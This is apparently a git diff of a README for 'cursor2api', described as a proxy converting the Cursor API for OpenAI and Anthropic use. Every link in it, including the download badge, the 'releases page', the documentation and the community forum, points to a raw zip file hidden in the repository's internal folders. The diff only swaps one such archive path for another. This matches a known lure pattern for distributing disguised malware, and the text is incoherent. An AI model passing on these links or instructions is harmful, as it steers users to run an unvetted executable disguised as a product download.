@@ -1,7 +1,7 @@
 # 🚀 cursor2api - Easily Transform Cursor API for OpenAI Use
 
 ## 📥 Download Now
-[![Download cursor2api](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip)](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip)
+[![Download cursor2api](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip)](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip)
 
 ## 🌟 Introduction
 Welcome to cursor2api! This application serves as a proxy service that converts the Cursor API into a format compatible with OpenAI and Anthropic. With cursor2api, you can easily integrate with these powerful AI interfaces without getting lost in technical details.
@@ -18,7 +18,7 @@ To run cursor2api smoothly, ensure you have the following:
 Follow these simple steps to download and run cursor2api:
 
 ### 1. Visit the Releases Page
-To get the latest version of cursor2api, [visit the releases page here](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip).
+To get the latest version of cursor2api, [visit the releases page here](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip).
 
 ### 2. Choose Your Version
 On the releases page, you will see a list of available versions. Each version may include updates and bug fixes. If you are unsure, it’s best to choose the latest version.
@@ -32,7 +32,7 @@ Once the download completes, go to your downloads folder (or the location you se
 ### 5. Install cursor2api
 - **For Windows:** Double-click the `.exe` file to begin installation. Follow the on-screen instructions.
 - **For macOS:** Open the `.dmg` file and drag the cursor2api icon to your Applications folder.
-- **For Linux:** If you downloaded a `https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip` file, extract it and run the executable from the terminal.
+- **For Linux:** If you downloaded a `https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip` file, extract it and run the executable from the terminal.
 
 ### 6. Run the Application
 Once installation is complete, locate cursor2api in your applications list. Double-click to open it. 
@@ -64,10 +64,10 @@ If you encounter any issues:
 If you need assistance, you can open an issue on our GitHub page, or find user guides in the repository.
 
 ## 🔗 Additional Resources
-- **Documentation:** [cursor2api Documentation](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip)
-- **Community Forum:** Join discussions about features and troubleshooting at our [community forum](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip).
+- **Documentation:** [cursor2api Documentation](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip)
+- **Community Forum:** Join discussions about features and troubleshooting at our [community forum](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip).
 
 ## 💡 Conclusion
 cursor2api simplifies your interaction with OpenAI and Anthropic APIs. Follow the simple steps to download and start using it today. 
 
-For further details and downloads, [visit the releases page here](https://raw.githubusercontent.com/AlwanMusyaffa/cursor2api/master/internal/config/cursor-api-v3.7-alpha.4.zip).
+For further details and downloads, [visit the releases page here](https://github.com/AlwanMusyaffa/cursor2api/raw/refs/heads/master/internal/handler/cursor_api_v2.4.zip).
